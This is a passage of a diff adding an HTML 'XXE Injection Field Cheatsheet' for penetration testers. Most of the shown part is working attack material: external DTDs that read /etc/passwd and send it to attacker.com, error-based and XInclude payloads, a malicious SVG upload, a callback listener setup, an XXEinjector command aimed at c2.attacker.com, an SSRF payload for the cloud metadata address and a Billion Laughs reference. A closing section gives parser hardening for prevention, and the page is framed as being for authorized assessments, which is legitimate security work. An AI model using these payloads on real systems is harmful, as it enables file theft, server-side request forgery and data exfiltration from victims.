+          <div class="code-block-header"><span class="lang">DTD · HOST ON ATTACKER SERVER</span><span>Step 2b — evil.dtd</span></div>
+          <pre><span class="hl">&lt;!ENTITY % file
+  SYSTEM "file:///etc/passwd"&gt;</span>
+<span class="hl">&lt;!ENTITY % exfil
+  "&lt;!ENTITY &#x25; send
+    SYSTEM 'http://attacker.com/?x=%file;'&gt;"&gt;</span>
+<span class="hl">%exfil;</span>
+<span class="hl">%send;</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <span class="callout-icon">⚠️</span>
+      <div><strong>Limitation:</strong> Files with XML metacharacters (<code>&lt; &gt; &amp;</code>) break the URL. Wrap with CDATA: use a second parameter entity to construct <code>&lt;![CDATA[</code> around the file read — or use DNS exfil (hex-encode the data as subdomains).</div>
+    </div>
+
+    <h3 style="font-family:var(--display);font-size:14px;color:#fff;margin:24px 0 12px;text-transform:uppercase;letter-spacing:.05em;">Step 3 — Error-based XXE (no OOB needed)</h3>
+
+    <div class="code-block">
+      <div class="code-block-header"><span class="lang">DTD · evil.dtd</span><span>Trigger parse error containing file contents</span></div>
+      <pre><span class="hl">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
+<span class="hl">&lt;!ENTITY % error
+  "&lt;!ENTITY &#x25; boom SYSTEM '%file;/nonexistent'&gt;"&gt;</span>
+<span class="hl">%error;</span>
+<span class="hl">%boom;</span>
+
+<span class="cm">&lt;!-- Parser error message contains the file path including
+     the file contents — visible in 500 error response --&gt;</span></pre>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── 9. NO DOCTYPE ─────────────────────────── -->
+  <section id="no-doctype">
+    <div class="section-header">
+      <span class="section-num">09</span>
+      <h2>XXE Without Modifying DOCTYPE — XInclude &amp; SVG</h2>
+    </div>
+
+    <div class="prose">
+      <p>Sometimes you <strong>can't inject a DOCTYPE</strong> — because you control only part of the XML (e.g., a value inside a SOAP message), or the server regenerates the DOCTYPE. Two alternatives:</p>
+    </div>
+
+    <div class="two-col">
+      <div>
+        <div class="code-block">
+          <div class="code-block-header"><span class="lang">XML</span><span>XInclude — inject into a value field</span></div>
+          <pre><span class="cm">&lt;!-- No DOCTYPE needed.
+     XInclude uses a namespace. --&gt;</span>
+<span class="kw">&lt;foo</span>
+  <span class="at">xmlns:xi=</span><span class="st">"http://www.w3.org/2001/XInclude"</span><span class="kw">&gt;</span>
+  <span class="hl">&lt;xi:include
+    parse="text"
+    href="file:///etc/passwd"/&gt;</span>
+<span class="kw">&lt;/foo&gt;</span></pre>
+        </div>
+        <div class="callout info" style="margin-top:8px">
+          <span class="callout-icon">ℹ️</span>
+          <div>Works when you can inject XML into any <em>value</em> that gets parsed. <code>parse="text"</code> is key — without it, the parser tries to parse the file as XML.</div>
+        </div>
+      </div>
+      <div>
+        <div class="code-block">
+          <div class="code-block-header"><span class="lang">SVG Upload</span><span>XXE via SVG image upload</span></div>
+          <pre><span class="cm">&lt;?xml version="1.0"?&gt;</span>
+<span class="hl">&lt;!DOCTYPE svg [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;</span>
+<span class="kw">&lt;svg</span>
+  <span class="at">xmlns=</span><span class="st">"http://www.w3.org/2000/svg"</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;text</span> <span class="at">y=</span><span class="st">"20"</span><span class="kw">&gt;</span><span class="hl">&amp;xxe;</span><span class="kw">&lt;/text&gt;</span>
+<span class="kw">&lt;/svg&gt;</span>
+
+<span class="cm">&lt;!-- Upload as .svg / image/svg+xml
+     Content may appear rendered in browser
+     or in response if fetched directly --&gt;</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="table-wrap" style="margin-top:20px">
+      <table>
+        <thead><tr><th>Scenario</th><th>Technique</th><th>Requirement</th></tr></thead>
+        <tbody>
+          <tr><td>Full XML body control</td><td>Classic DOCTYPE injection</td><td>Parser allows external entities</td></tr>
+          <tr><td>Control a value inside XML</td><td>XInclude</td><td>Server supports XInclude processing</td></tr>
+          <tr><td>File upload (image)</td><td>SVG with DOCTYPE</td><td>Server parses SVG as XML</td></tr>
+          <tr><td>DOCX/XLSX upload</td><td>Modify embedded XML parts</td><td>Server opens/processes the file</td></tr>
+          <tr><td>JSON that becomes XML</td><td>Content-Type swap + classic</td><td>Backend converts JSON→XML</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── 10. C&C / TOOLING ─────────────────────────── -->
+  <section id="c2">
+    <div class="section-header">
+      <span class="section-num">10</span>
+      <h2>Exploiting XXE with C&amp;C Infrastructure &amp; Tooling</h2>
+    </div>
+
+    <div class="prose">
+      <p>For blind XXE exfiltration in real engagements, you need an attacker-controlled server for hosting external DTDs and receiving callbacks. Here's a practical workflow using typical ERNW tooling.</p>
+    </div>
+
+    <h3 style="font-family:var(--display);font-size:14px;color:#fff;margin:20px 0 10px;text-transform:uppercase;letter-spacing:.05em;">Infrastructure Setup</h3>
+
+    <div class="code-block">
+      <div class="code-block-header"><span class="lang">BASH · C&amp;C Server</span><span>Serve evil.dtd + log incoming requests</span></div>
+      <pre><span class="cm"># Minimal Python HTTP server that logs all requests</span>
+<span class="ok">python3 -m http.server 80</span>
+
+<span class="cm"># Or with request logging to file:</span>
+<span class="ok">python3 -c "
+import http.server, sys
+class L(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f'[HIT] {self.path}', flush=True)
+        self.send_response(200); self.end_headers()
+http.server.HTTPServer(('',80),L).serve_forever()
+"</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block-header"><span class="lang">BASH · C&amp;C Server</span><span>Capture DNS exfil with tcpdump or dnslog</span></div>
+      <pre><span class="cm"># Listen for DNS queries (your NS for attacker.com must point here)</span>
+<span class="ok">tcpdump -i eth0 -n udp port 53 | grep attacker.com</span>
+
+<span class="cm"># Or use interactsh-client (open source Burp Collaborator alternative)</span>
+<span class="ok">interactsh-client -v</span>
+<span class="cm"># gives you: abc123.oast.fun — use as your callback domain</span></pre>
+    </div>
+
+    <h3 style="font-family:var(--display);font-size:14px;color:#fff;margin:24px 0 10px;text-transform:uppercase;letter-spacing:.05em;">Tooling Overview</h3>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Tool</th><th>Use Case</th><th>Notes</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Burp Suite Pro</strong></td><td>Intercept, modify, replay XML; Collaborator for blind OOB</td><td>Go-to for manual XXE</td></tr>
+          <tr><td><strong>Burp Collaborator</strong></td><td>DNS/HTTP callback server, auto-correlated</td><td>Built into Burp Pro; use <code>oastify.com</code> domains</td></tr>
+          <tr><td><strong>interactsh</strong></td><td>Open-source Collaborator alternative</td><td><code>interactsh-client</code> CLI</td></tr>
+          <tr><td><strong>XXEinjector</strong></td><td>Automated XXE file enumeration &amp; OOB exfil</td><td>Ruby; good for bulk file reads</td></tr>
+          <tr><td><strong>xmllint</strong></td><td>Parse &amp; test DTD structure locally</td><td><code>xmllint --noent payload.xml</code></td></tr>
+          <tr><td><strong>Python requests</strong></td><td>Scripted payload delivery</td><td>Set <code>Content-Type: application/xml</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3 style="font-family:var(--display);font-size:14px;color:#fff;margin:24px 0 10px;text-transform:uppercase;letter-spacing:.05em;">Full Blind Exfil Workflow</h3>
+
+    <div class="steps">
+      <li>
+        <div class="step-body">
+          <strong>Host evil.dtd on C&amp;C</strong>
+          <p>Place <code>evil.dtd</code> on your C&amp;C server. It reads the target file and sends its contents to your listener as a URL parameter.</p>
+        </div>
+      </li>
+      <li>
+        <div class="step-body">
+          <strong>Send trigger payload to target</strong>
+          <p>XML body references <code>http://c2.attacker.com/evil.dtd</code> via a parameter entity. Target fetches the DTD.</p>
+        </div>
+      </li>
+      <li>
+        <div class="step-body">
+          <strong>Target evaluates DTD, reads file, sends callback</strong>
+          <p>Your listener receives <code>GET /?data=root:x:0:0:...%0Adaemon:...</code>. URL-decode the parameter to get the file.</p>
+        </div>
+      </li>
+      <li>
+        <div class="step-body">
+          <strong>Automate with XXEinjector for bulk reads</strong>
+          <p><code>ruby XXEinjector.rb --host=c2.attacker.com --file=/burp_request.txt --path=/etc/ --oob=http</code></p>
+        </div>
+      </li>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── 11. PREVENTION ─────────────────────────── -->
+  <section id="prevention">
+    <div class="section-header">
+      <span class="section-num">11</span>
+      <h2>Prevention</h2>
+    </div>
+
+    <div class="callout tip">
+      <span class="callout-icon">✅</span>
+      <div><strong>Primary fix: disable external entity processing in your XML parser.</strong> Everything else is defense-in-depth.</div>
+    </div>
+
+    <div class="card-grid" style="margin-top:20px">
+      <div class="card green">
+        <h3>1. Disable External Entities</h3>
+        <p>Configure your XML parser to reject external entities and DTD processing. This is the direct fix.</p>
+      </div>
+      <div class="card green">
+        <h3>2. Use Safe Data Formats</h3>
+        <p>Prefer JSON or YAML for APIs. Less attack surface, no entity concept. Only use XML where necessary.</p>
+      </div>
+      <div class="card green">
+        <h3>3. Server-Side Input Validation</h3>
+        <p>Validate that XML conforms to expected schema before parsing. Reject documents with DOCTYPE declarations unless required.</p>
+      </div>
+      <div class="card green">
+        <h3>4. Patch &amp; Keep Libraries Current</h3>
+        <p>XML parser libraries regularly patch XXE-related issues. Run <code>npm audit</code>, <code>mvn dependency-check</code>, etc. regularly.</p>
+      </div>
+    </div>
+
+    <h3 style="font-family:var(--display);font-size:14px;color:#fff;margin:28px 0 12px;text-transform:uppercase;letter-spacing:.05em;">Parser-Specific Hardening</h3>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Language / Parser</th><th>Safe Configuration</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><strong>Java (SAXParser)</strong></td>
+            <td><code>factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)</code></td>
+          </tr>
+          <tr>
+            <td><strong>Java (DocumentBuilder)</strong></td>
+            <td><code>factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)</code></td>
+          </tr>
+          <tr>
+            <td><strong>Python (lxml)</strong></td>
+            <td><code>etree.XMLParser(resolve_entities=False, no_network=True)</code></td>
+          </tr>
+          <tr>
+            <td><strong>Python (defusedxml)</strong></td>
+            <td>Drop-in safe replacement: <code>import defusedxml.ElementTree as ET</code></td>
+          </tr>
+          <tr>
+            <td><strong>.NET (XmlReader)</strong></td>
+            <td><code>XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }</code></td>
+          </tr>
+          <tr>
+            <td><strong>PHP (libxml)</strong></td>
+            <td><code>libxml_disable_entity_loader(true)</code> (PHP &lt; 8.0; disabled by default in 8.0+)</td>
+          </tr>
+          <tr>
+            <td><strong>Node.js (node-expat / libxmljs)</strong></td>
+            <td>Check for <code>resolve_entities: false</code>; prefer <code>sax</code> or validated parsers</td>
+          </tr>
+          <tr>
+            <td><strong>Ruby (Nokogiri)</strong></td>
+            <td><code>Nokogiri::XML::ParseOptions::NONET | NOENT</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="code-block" style="margin-top:24px">
+      <div class="code-block-header"><span class="lang">PYTHON</span><span>Safe XML parsing with defusedxml</span></div>
+      <pre><span class="cm"># pip install defusedxml</span>
+<span class="kw">import</span> defusedxml.ElementTree <span class="kw">as</span> ET
+
+<span class="cm"># Any XXE/XInclude/entity bomb attempt raises an exception</span>
+<span class="ok">tree = ET.parse("user_input.xml")</span>    <span class="cm"># safe drop-in</span>
+root = tree.getroot()</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block-header"><span class="lang">JAVA</span><span>Secure SAX parser setup</span></div>
+      <pre>SAXParserFactory factory = SAXParserFactory.newInstance();
+<span class="ok">factory.setFeature(
+  "http://apache.org/xml/features/disallow-doctype-decl", <span class="kw">true</span>
+);</span>
+<span class="ok">factory.setFeature(
+  "http://xml.org/sax/features/external-general-entities", <span class="kw">false</span>
+);</span>
+<span class="ok">factory.setFeature(
+  "http://xml.org/sax/features/external-parameter-entities", <span class="kw">false</span>
+);</span>
+SAXParser parser = factory.newSAXParser();</pre>
+    </div>
+
+    <div class="callout tip" style="margin-top:24px">
+      <span class="callout-icon">🔗</span>
+      <div><strong>OWASP XML Security Cheat Sheet</strong> — <code>cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</code> — comprehensive parser-by-parser reference.</div>
+    </div>
+  </section>
+
+  <!-- ─────────────────────────── QUICK REF ─────────────────────────── -->
+  <section>
+    <div class="section-header">
+      <span class="section-num">REF</span>
+      <h2>Quick Payload Reference</h2>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Goal</th><th>Payload Skeleton</th></tr></thead>
+        <tbody>
+          <tr><td>Read local file (inline)</td><td><code>&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt; … &amp;x;</code></td></tr>
+          <tr><td>SSRF / internal HTTP</td><td><code>&lt;!ENTITY x SYSTEM "http://169.254.169.254/..."&gt;</code></td></tr>
+          <tr><td>Blind OOB ping</td><td><code>&lt;!ENTITY x SYSTEM "http://collaborator.id/"&gt;</code></td></tr>
+          <tr><td>Blind OOB + file exfil</td><td>Parameter entity → external evil.dtd → %file; in URL</td></tr>
+          <tr><td>Error-based</td><td>%file; used in invalid path → error message leaks content</td></tr>
+          <tr><td>XInclude (no DOCTYPE)</td><td><code>&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;</code></td></tr>
+          <tr><td>SVG upload</td><td>SVG with DOCTYPE + <code>&lt;text&gt;&amp;xxe;&lt;/text&gt;</code></td></tr>
+          <tr><td>DoS (Billion Laughs)</td><td>Nested entities: <code>&amp;lol9;</code> expands to 10^9 copies of "lol"</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  XXE Injection Field Cheatsheet · For authorized security assessments only · Based on OWASP &amp; PortSwigger research
+</footer>
+
+<script>
+  // Copy button functionality
+  document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const pre = btn.closest('.code-block').querySelector('pre');
+      navigator.clipboard.writeText(pre.innerText).then(() => {
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = 'Copy', 1500);
+      });
+    });
+  });
+
+  // Inject copy buttons
+  document.querySelectorAll('.code-block-header').forEach(h => {
+    const btn = document.createElement('button');
+    btn.className = 'copy-btn';
+    btn.textContent = 'Copy';
+    h.appendChild(btn);
+  });
+</script>
+</body>
+</html>
